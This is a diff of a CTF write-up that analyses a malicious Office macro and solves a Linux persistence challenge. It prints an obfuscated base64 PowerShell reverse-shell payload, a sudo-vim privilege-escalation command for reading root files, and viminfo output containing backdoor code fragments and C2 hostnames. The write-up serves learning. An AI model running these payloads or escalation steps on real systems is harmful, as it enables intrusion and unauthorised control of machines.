@@ -30,12 +30,12 @@ This 24-hour CTF has 30 challenges, and it is the first stage of "CTF Internacio
 |[Decrypting the payload](#decrypting-the-payload) | Mission | 100 | ✔️ | ✔️ | ✔️ |
 |[Locked outside](#locked-outside) | Mission | 100 | ✔️ | ✔️ | ✔️ |
 |[Something Suspicious](#something-suspicious) | Mission | 100 | ✔️ | ✔️ | ✔️ |
-|[Changing our locks and dumping old keys](#changing-our-locks-and-dumping-old-keys) | Mission | 100 | ✔️ |  |  |
-|[Know your enemy](#know-your-enemy) | Mission | 191 | ✔️ |  |  |
-|[Blue team becomes Red Team](#blue-team-becomes-red-team) | Mission | 269 | ✔️ |  |  |
-|[Getting the crown jewels](#getting-the-crown-jewels) | Mission | 269 | ✔️ |  |  |
-|[Locating our Attacker](#locating-our-attacker) | Mission | 443 | ❌ |  |  |
-|[Crime doesnt' pay](#crime-doesnt-pay) | Mission | 481 | ❌ |  |  |
+|[Changing our locks and dumping old keys](#changing-our-locks-and-dumping-old-keys) | Mission | 100 | ✔️ | ✔️ | ✔️ |
+|[Know your enemy](#know-your-enemy) | Mission | 191 | ✔️ | ❌ | ❌ |
+|[Blue team becomes Red Team](#blue-team-becomes-red-team) | Mission | 269 | ✔️ | ❌ | ❌ |
+|[Getting the crown jewels](#getting-the-crown-jewels) | Mission | 269 | ✔️ | ❌ | ❌ |
+|[Locating our Attacker](#locating-our-attacker) | Mission | 443 | ❌ | ❌ | ❌ |
+|[Crime doesnt' pay](#crime-doesnt-pay) | Mission | 481 | ❌ | ❌ | ❌ |
 
 
 ## A simple challenge
@@ -720,16 +720,16 @@ End Function
 ```
 
 Let’s modify the line: 
-```
+```ps
 x = Shell(aeythrpom & vultiormen & moabehina & hujilkomna & tuabnimne & wuotamw & sjeldmajek & afsyedlmen & eujrtabem)
 ```
 with:
-```
+```ps
 Console.WriteLine(aeythrpom & vultiormen & moabehina & hujilkomna & tuabnimne & wuotamw & sjeldmajek & afsyedlmen & eujrtabem)
 ```
 
 We find ourselves again with a big block but this time it is a Powershell command in base64:
-```
+```ps
 powershell.exe -exec bypass -noexit -w hidden -enc  JAB0ACAAPQAgACcAWwBEAGwAbABJAG0AcABvAHIAdAAoAFwAIgB1AHMAZQByADMAMgAuAGQAbABsAFwAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAUwBoAG8AdwBXAGkAbgBkAG8AdwAoAGkAbgB0ACAAaABhAG4AZABsAGUALAAgAGkAbgB0ACAAcwB0AGEAdABlACkAOwAnADsADQAKAGEAZABkAC0AdAB5AHAAZQAgAC0AbgBhAG0AZQAgAHcAaQBuACAALQBtAGUAbQBiAGUAcgAgACQAdAAgAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABuAGEAdABpAHYAZQA7AFsAbgBhAHQAaQB2AGUALgB3AGkAbgBdADoAOgBTAGgAbwB3AFcAaQBuAGQAbwB3ACgAKABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApACAAfAAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwApAC4ATQBhAGkAbgBXAGkAbgBkAG8AdwBIAGEAbgBkAGwAZQAsACAAMAApADsADQAKAGkAZQB4ACAAKAAgAFsAUwB0AHIAaQBuAEcAXQA6ADoAagBvAGkAbgAoACcAJwAsACAAKABbAHIARQBHAGUAWABdADoAOgBNAGEAVABjAGgAZQBTACgAIAAiACkAIAAnAHgAJwArAF0AMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwAxAFsARABJAGwATABlAEgAcwAkACsAXQAxAFsARABpAEwATABlAGgAcwAkACAAKAAmAHwAIAApADQAMwBdAFIAQQBoAGMAWwBdAEcAbgBJAFIAVABzAFsALAAnAHQAWABqACcAKABlAGMAQQBMAFAARQBSAC4AKQAnACQAJwAsACcAdwBxAGkAJwAoAGUAQwBBAEwAUABFAFIALgApACcAOwB0AFgAJwArACcAagBzAGMAMABkAF8AZAAzAGwAYgA0AG4AMwBfADAAcgBjADQAbQAnACsAJwB7AGcAJwArACcAYQAnACsAJwBsAGYAdABYAGoAIAAnACsAJwA9ADEAXwBnAGEAJwArACcAbABmAHcAcQBpACcAKAAiACwAJwAuACcALAAgACcAUgAnACsAJwBpAEcASABUAHQATwBsACcAKwAnAGUAZgB0ACcAIAApACAAfAAgAGYAbwByAEUAQQBjAEgALQBvAEIASgBlAGMAVAAgAHsAJABfAC4AVgBBAEwAVQBFAH0AIAApACkAIAApADsADQAKAFMARQB0ACAAKAAiAEcAOAAiACsAIgBoACIAKQAgACgAIAAiACAAKQAgACkANgAzAF0AUgBhAGgAYwBbACwAJwByAGEAWgAnAEUAYwBhAGwAUABlAFIALQAgADQAMwBdAFIAYQBoAGMAWwAsACkAMAA1AF0AUgBhAGgAYwBbACsAOAA3AF0AUgBhAGgAYwBbACsAOQA0AF0AUgBhAGgAYwBbACgAIAAgAGUAQwBBAGwAcABFAFIAYwAtACAAIAApACcAOwAyACcAKwAnAE4AJwArACcAMQAnACsAJwB9AHMAdQAwAHIAMwBnACcAKwAnAG4ANABkAF8AMwByADQAJwArACcAXwAyAE4AMQAgAD0AIAAyAF8AZwBhACcAKwAnAGwAZgByACcAKwAnAGEAWgAnACgAKAAgACgAIAApACcAJwBuAGkATwBqAC0AJwB4ACcAKwBdADMALAAxAFsAKQAoAEcATgBpAHIAVABTAG8AdAAuAEUAYwBOAGUAcgBlAEYAZQBSAHAARQBzAE8AQgBSAEUAdgAkACAAKAAgAC4AIAAiACAAIAApACAAOwAtAGoATwBJAG4AIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBMAHUAZQBbACAALQAgADEALgAuACAALQAgACgAIAAoACAAbABTACAAKAAiAFYAQQBSACIAKwAiAEkAYQBCACIAKwAiAEwARQA6AGcAIgArACIAOABIACIAKQAgACAAKQAuAFYAQQBMAHUAZQAuAEwAZQBuAGcAdABIACkAXQAgAHwAIABJAGUAWAANAAoAJABwAGEAeQBsAG8AYQBkACAAPQAgACIASgBBAEIAagBBAEcAdwBBAGEAUQBCAGwAQQBHADQAQQBkAEEAQQBnAEEARAAwAEEASQBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAFUAdwBCADUAQQBIAE0AQQBkAEEAQgBsAEEARwAwAEEATABnAEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBiAHcAQgBqAEEARwBzAEEAWgBRAEIAMABBAEgATQBBAEwAZwBCAFUAQQBFAE0AQQBVAEEAQgBEAEEARwB3AEEAYQBRAEIAbABBAEcANABBAGQAQQBBAG8AQQBDAEkAQQBNAFEAQQA1AEEARABJAEEATABnAEEAdwBBAEMANABBAE0AZwBBAHUAQQBEAEUAQQBNAHcAQQB5AEEAQwBJAEEATABBAEEAMABBAEQAUQBBAE0AdwBBAHAAQQBEAHMAQQBKAEEAQgB6AEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDADQAQQBSAHcAQgBsAEEASABRAEEAVQB3AEIAMABBAEgASQBBAFoAUQBCAGgAQQBHADAAQQBLAEEAQQBwAEEARABzAEEAVwB3AEIAaQBBAEgAawBBAGQAQQBCAGwAQQBGAHMAQQBYAFEAQgBkAEEAQwBRAEEAWQBnAEIANQBBAEgAUQBBAFoAUQBCAHoAQQBDAEEAQQBQAFEAQQBnAEEARABBAEEATABnAEEAdQBBAEQAWQBBAE4AUQBBADEAQQBEAE0AQQBOAFEAQgA4AEEAQwBVAEEAZQB3AEEAdwBBAEgAMABBAE8AdwBCADMAQQBHAGcAQQBhAFEAQgBzAEEARwBVAEEASwBBAEEAbwBBAEMAUQBBAGEAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEASABNAEEAZABBAEIAeQBBAEcAVQBBAFkAUQBCAHQAQQBDADQAQQBVAGcAQgBsAEEARwBFAEEAWgBBAEEAbwBBAEMAUQBBAFkAZwBCADUAQQBIAFEAQQBaAFEAQgB6AEEAQwB3AEEASQBBAEEAdwBBAEMAdwBBAEkAQQBBAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEAYwB3AEEAdQBBAEUAdwBBAFoAUQBCAHUAQQBHAGMAQQBkAEEAQgBvAEEAQwBrAEEASwBRAEEAZwBBAEMAMABBAGIAZwBCAGwAQQBDAEEAQQBNAEEAQQBwAEEASABzAEEATwB3AEEAawBBAEcAUQBBAFkAUQBCADAAQQBHAEUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAEwAUQBCAFUAQQBIAGsAQQBjAEEAQgBsAEEARQA0AEEAWQBRAEIAdABBAEcAVQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEYAUQBBAFoAUQBCADQAQQBIAFEAQQBMAGcAQgBCAEEARgBNAEEAUQB3AEIASgBBAEUAawBBAFIAUQBCAHUAQQBHAE0AQQBiAHcAQgBrAEEARwBrAEEAYgBnAEIAbgBBAEMAawBBAEwAZwBCAEgAQQBHAFUAQQBkAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8AQQBDAFEAQQBZAGcAQgA1AEEASABRAEEAWgBRAEIAegBBAEMAdwBBAE0AQQBBAHMAQQBDAEEAQQBKAEEAQgBwAEEAQwBrAEEATwB3AEEAawBBAEgATQBBAFoAUQBCAHUAQQBHAFEAQQBZAGcAQgBoAEEARwBNAEEAYQB3AEEAZwBBAEQAMABBAEkAQQBBAG8AQQBHAGsAQQBaAFEAQgA0AEEAQwBBAEEASgBBAEIAawBBAEcARQBBAGQAQQBCAGgAQQBDAEEAQQBNAGcAQQArAEEAQwBZAEEATQBRAEEAZwBBAEgAdwBBAEkAQQBCAFAAQQBIAFUAQQBkAEEAQQB0AEEARgBNAEEAZABBAEIAeQBBAEcAawBBAGIAZwBCAG4AQQBDAEEAQQBLAFEAQQA3AEEAQwBRAEEAYwB3AEIAbABBAEcANABBAFoAQQBCAGkAQQBHAEUAQQBZAHcAQgByAEEARABJAEEASQBBAEEAZwBBAEQAMABBAEkAQQBBAGsAQQBIAE0AQQBaAFEAQgB1AEEARwBRAEEAWQBnAEIAaABBAEcATQBBAGEAdwBBAGcAQQBDAHMAQQBJAEEAQQBpAEEARgBBAEEAVQB3AEEAZwBBAEMASQBBAEkAQQBBAHIAQQBDAEEAQQBLAEEAQgB3AEEASABjAEEAWgBBAEEAcABBAEMANABBAFUAQQBCAGgAQQBIAFEAQQBhAEEAQQBnAEEAQwBzAEEASQBBAEEAaQBBAEQANABBAEkAQQBBAGkAQQBEAHMAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIAYgBBAEgAUQBBAFoAUQBCADQAQQBIAFEAQQBMAGcAQgBsAEEARwA0AEEAWQB3AEIAdgBBAEcAUQBBAGEAUQBCAHUAQQBHAGMAQQBYAFEAQQA2AEEARABvAEEAUQBRAEIAVABBAEUATQBBAFMAUQBCAEoAQQBDAGsAQQBMAGcAQgBIAEEARwBVAEEAZABBAEIAQwBBAEgAawBBAGQAQQBCAGwAQQBIAE0AQQBLAEEAQQBrAEEASABNAEEAWgBRAEIAdQBBAEcAUQBBAFkAZwBCAGgAQQBHAE0AQQBhAHcAQQB5AEEAQwBrAEEATwB3AEEAawBBAEgATQBBAGQAQQBCAHkAQQBHAFUAQQBZAFEAQgB0AEEAQwA0AEEAVgB3AEIAeQBBAEcAawBBAGQAQQBCAGwAQQBDAGcAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBMAEEAQQB3AEEAQwB3AEEASgBBAEIAegBBAEcAVQBBAGIAZwBCAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEATABnAEIATQBBAEcAVQBBAGIAZwBCAG4AQQBIAFEAQQBhAEEAQQBwAEEARABzAEEASgBBAEIAegBBAEgAUQBBAGMAZwBCAGwAQQBHAEUAQQBiAFEAQQB1AEEARQBZAEEAYgBBAEIAMQBBAEgATQBBAGEAQQBBAG8AQQBDAGsAQQBmAFEAQQA3AEEAQwBRAEEAWQB3AEIAcwBBAEcAawBBAFoAUQBCAHUAQQBIAFEAQQBMAGcAQgBEAEEARwB3AEEAYgB3AEIAegBBAEcAVQBBAEsAQQBBAHAAQQBEAHMAQQAiAA0ACgAkAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcABhAHkAbABvAGEAZAApACkADQAKAGkAZgAgACgAJABwAGEAeQBsAG8AYQBkACAALQBtAGEAdABjAGgAIAAiAGgAdAB0AHAAOgB8AGgAdAB0AHAAcwA6ACIAKQAgAHsADQAKACAAIAAgACAAJABwAGEAeQBsAG8AYQBkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgACIATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAAiACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHAAYQB5AGwAbwBhAGQAKQA7AA0ACgB9AA0ACgBpAGUAeAAgACQAYwA7AA==
 ```
 
@@ -881,6 +881,581 @@ There should be something in the server that was used to maintain persistence.
 Can you track this one and find more information about the attacker?
 
 Flag format: flag{string}
+
+**Solution**
+
+We need to go back to Jenkins found in [The lost Jetson](#the-lost-jetson) (or a reverse shell but groovy didn't work for me huh). 
+
+I wanted to look at the `/root` folder to see if there was anything interesting however I lacked permission, so we have to start with `sudo -l` to see what we have access to as root:
+
+```
+User jenkins may run the following commands on lockedout:
+    (root) NOPASSWD: /usr/bin/vim
+```
+
+We have access to vim as root and it does well vim has an argument `-c` that allows us to execute commands including the one I wanted to run `ls -la/root`:
+
+ `sudo /usr/bin/vim -c ':!ls /root'`
+ ```ls
+ total 28
+drwx------    3 root     root          4096 Jul 13 16:52 .
+drwxr-xr-x   22 root     root          4096 Jun 21 17:36 ..
+lrwxrwxrwx    1 root     root             9 Jun 24 15:37 .ash_history -> /dev/null
+-rw-------    1 root     root           684 Jun  9 10:20 .joe_state
+drwx------    2 root     root          4096 Jun 24 15:37 .ssh
+-rw-------    1 root     root         10774 Jul 13 16:52 .viminfo
+```
+
+There’s a big file called `.viminfo`, let’s see what’s inside:
+
+`sudo /usr/bin/vim -c ':!cat /root/.viminfo'`
+```
+# This viminfo file was generated by Vim 8.2.
+# You may edit it if you're careful!
+
+# Viminfo version
+|1,4
+
+# Value of 'encoding' when this file was written
+*encoding=utf-8
+
+
+# hlsearch on (H) or off (h):
+~h
+# Command Line History (newest to oldest):
+:wq!
+|2,0,1626191548,,"wq!"
+:wq
+|2,0,1626191547,,"wq"
+:q
+|2,0,1624607933,,"q"
+:q!
+|2,0,1624527558,,"q!"
+:w
+|2,0,1624464230,,"w"
+
+# Search String History (newest to oldest):
+
+# Expression History (newest to oldest):
+
+# Input Line History (newest to oldest):
+
+# Debug Line History (newest to oldest):
+
+# Registers:
+"0	LINE	0
+	            ssls.send(str.encode("flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}"))
+|3,0,0,1,1,0,1624456492,"            ssls.send(str.encode(\"flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}\"))"
+""1	LINE	0
+	192.168.1.19	m1cr0s0ft.hax
+|3,1,1,1,1,0,1624607936,"192.168.1.19	m1cr0s0ft.hax"
+"2	LINE	0
+	192.168.230.217 c2.m1cr0s0ft.hax
+|3,0,2,1,1,0,1624547030,"192.168.230.217 c2.m1cr0s0ft.hax"
+"3	LINE	0
+	[2001:db8:a:1:5054:ff:fecb:1279]:2200 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIYbW+R6HY40Hu6KqnZrDfnsI78rqrbvyMyROXg0C/nbswup/wEHWU3Fb2vrBbaslk9K4umHWQfG2FpJZ6FBc2A=
+|3,0,3,1,1,0,1624545452,"[2001:db8:a:1:5054:ff:fecb:1279]:2200 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIYbW+R6HY40Hu6KqnZrDfnsI78rqrbvyMyROXg0C/nbswup/wEHWU3Fb2vrBbaslk9K4umHWQfG2FpJZ6FBc2A="
+"4	LINE	0
+	192.168.202.254 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIYbW+R6HY40Hu6KqnZrDfnsI78rqrbvyMyROXg0C/nbswup/wEHWU3Fb2vrBbaslk9K4umHWQfG2FpJZ6FBc2A=
+|3,0,4,1,1,0,1624545451,"192.168.202.254 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIYbW+R6HY40Hu6KqnZrDfnsI78rqrbvyMyROXg0C/nbswup/wEHWU3Fb2vrBbaslk9K4umHWQfG2FpJZ6FBc2A="
+"5	LINE	0
+	            ssls.send(str.encode("flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}\n"))
+|3,0,5,1,1,0,1624461616,"            ssls.send(str.encode(\"flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}\\n\"))"
+"6	LINE	0
+	            ssls.send(str.encode("flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}"))
+|3,0,6,1,1,0,1624456493,"            ssls.send(str.encode(\"flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}\"))"
+"7	LINE	0
+		int s;
+|3,0,7,1,1,0,1624439172,"	int s;"
+"8	LINE	0
+		struct sockaddr_in sa;
+|3,0,8,1,1,0,1624439172,"	struct sockaddr_in sa;"
+"9	LINE	0
+	#define REMOTE_PORT 23456
+|3,0,9,1,1,0,1624439167,"#define REMOTE_PORT 23456"
+"-	CHAR	0
+	b
+|3,0,36,0,1,0,1624546107,"b"
+
+# File marks:
+'0  80  20  /etc/sudoers
+|4,48,80,20,1626191548,"/etc/sudoers"
+'1  2  0  /etc/hosts
+|4,49,2,0,1624607938,"/etc/hosts"
+'2  1  0  /etc/host
+|4,50,1,0,1624607933,"/etc/host"
+'3  3  12  /etc/hosts
+|4,51,3,12,1624607919,"/etc/hosts"
+'4  3  12  /etc/hosts
+|4,52,3,12,1624607919,"/etc/hosts"
+'5  3  28  /etc/hosts
+|4,53,3,28,1624607893,"/etc/hosts"
+'6  3  28  /etc/hosts
+|4,54,3,28,1624607893,"/etc/hosts"
+'7  3  14  /etc/hosts
+|4,55,3,14,1624607842,"/etc/hosts"
+'8  3  14  /etc/hosts
+|4,56,3,14,1624607842,"/etc/hosts"
+'9  3  14  /etc/hosts
+|4,57,3,14,1624607842,"/etc/hosts"
+
+# Jumplist (newest first):
+-'  80  20  /etc/sudoers
+|4,39,80,20,1626191548,"/etc/sudoers"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607938,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607938,"/etc/hosts"
+-'  3  12  /etc/hosts
+|4,39,3,12,1624607935,"/etc/hosts"
+-'  3  12  /etc/hosts
+|4,39,3,12,1624607935,"/etc/hosts"
+-'  1  0  /etc/host
+|4,39,1,0,1624607933,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624607933,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624607933,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624607933,"/etc/host"
+-'  3  12  /etc/hosts
+|4,39,3,12,1624607919,"/etc/hosts"
+-'  3  12  /etc/hosts
+|4,39,3,12,1624607919,"/etc/hosts"
+-'  3  12  /etc/hosts
+|4,39,3,12,1624607919,"/etc/hosts"
+-'  3  12  /etc/hosts
+|4,39,3,12,1624607919,"/etc/hosts"
+-'  3  28  /etc/hosts
+|4,39,3,28,1624607893,"/etc/hosts"
+-'  3  28  /etc/hosts
+|4,39,3,28,1624607893,"/etc/hosts"
+-'  3  28  /etc/hosts
+|4,39,3,28,1624607893,"/etc/hosts"
+-'  3  28  /etc/hosts
+|4,39,3,28,1624607893,"/etc/hosts"
+-'  3  14  /etc/hosts
+|4,39,3,14,1624607842,"/etc/hosts"
+-'  3  14  /etc/hosts
+|4,39,3,14,1624607842,"/etc/hosts"
+-'  3  14  /etc/hosts
+|4,39,3,14,1624607842,"/etc/hosts"
+-'  3  14  /etc/hosts
+|4,39,3,14,1624607842,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624607798,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624547032,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624547032,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624547032,"/etc/hosts"
+-'  2  0  /etc/hosts
+|4,39,2,0,1624547032,"/etc/hosts"
+-'  3  27  /etc/hosts
+|4,39,3,27,1624547028,"/etc/hosts"
+-'  3  27  /etc/hosts
+|4,39,3,27,1624547028,"/etc/hosts"
+-'  3  27  /etc/hosts
+|4,39,3,27,1624547028,"/etc/hosts"
+-'  3  27  /etc/hosts
+|4,39,3,27,1624547028,"/etc/hosts"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+-'  1  0  /etc/host
+|4,39,1,0,1624547026,"/etc/host"
+
+# History of marks within files (newest to oldest):
+
+> /etc/sudoers
+	*	1626191547	0
+	"	80	20
+	^	80	21
+	.	80	20
+	+	80	20
+
+> /etc/hosts
+	*	1624607937	0
+	"	2	0
+	.	3	0
+	+	3	0
+
+> /etc/host
+	*	1624607932	0
+	"	1	0
+
+> /tmp/stayalive.py
+	*	1624546824	0
+	"	2	12
+	^	2	13
+	.	2	13
+	+	1	7
+	+	8	20
+	+	7	16
+	+	8	14
+	+	9	9
+	+	10	12
+	+	6	10
+	+	9	23
+	+	10	28
+	+	2	13
+
+> ~/.ssh/known_hosts
+	*	1624545453	0
+	"	1	0
+	.	1	0
+	+	1	0
+
+> ~/.ash_history
+	*	1624545357	0
+	"	1	0
+
+> /tmp/r.py
+	*	1624531116	0
+	"	1	0
+	^	48	11
+	.	49	0
+	+	2	53
+	+	1	36
+	+	48	53
+	+	48	71
+	+	25	19
+	+	25	29
+	+	25	16
+	+	48	95
+	+	48	116
+	+	48	137
+	+	48	170
+	+	3	34
+	+	11	0
+	+	8	25
+	+	9	16
+	+	25	3
+	+	25	0
+	+	14	46
+	+	17	47
+	+	19	12
+	+	21	27
+	+	22	53
+	+	24	43
+	+	17	37
+	+	28	25
+	+	26	7
+	+	30	0
+	+	54	9
+	+	30	28
+	+	31	23
+	+	32	27
+	+	33	57
+	+	42	17
+	+	41	16
+	+	43	46
+	+	46	12
+	+	19	9
+	+	54	24
+	+	53	23
+	+	54	9
+	+	35	0
+	+	34	18
+	+	29	13
+	+	35	34
+	+	14	47
+	+	42	17
+	+	33	75
+	+	8	26
+	+	33	0
+	+	38	0
+	+	21	103
+	+	8	14
+	+	6	8
+	+	9	14
+	+	6	8
+	+	11	14
+	+	8	0
+	+	12	14
+	+	8	8
+	+	9	8
+	+	11	7
+	+	12	8
+	+	7	27
+	+	21	61
+	+	7	30
+	+	21	27
+	+	22	51
+	+	48	20
+	+	3	34
+	+	3	45
+	+	4	0
+	+	10	18
+	+	49	0
+
+> /tmp/__pycache__/r.pyc
+	*	1624447425	0
+	"	1	0
+
+> /tmp/b.py
+	*	1624445270	0
+	"	10	28
+	^	26	39
+	.	26	38
+	+	9	58
+	+	10	29
+	+	11	14
+	+	14	26
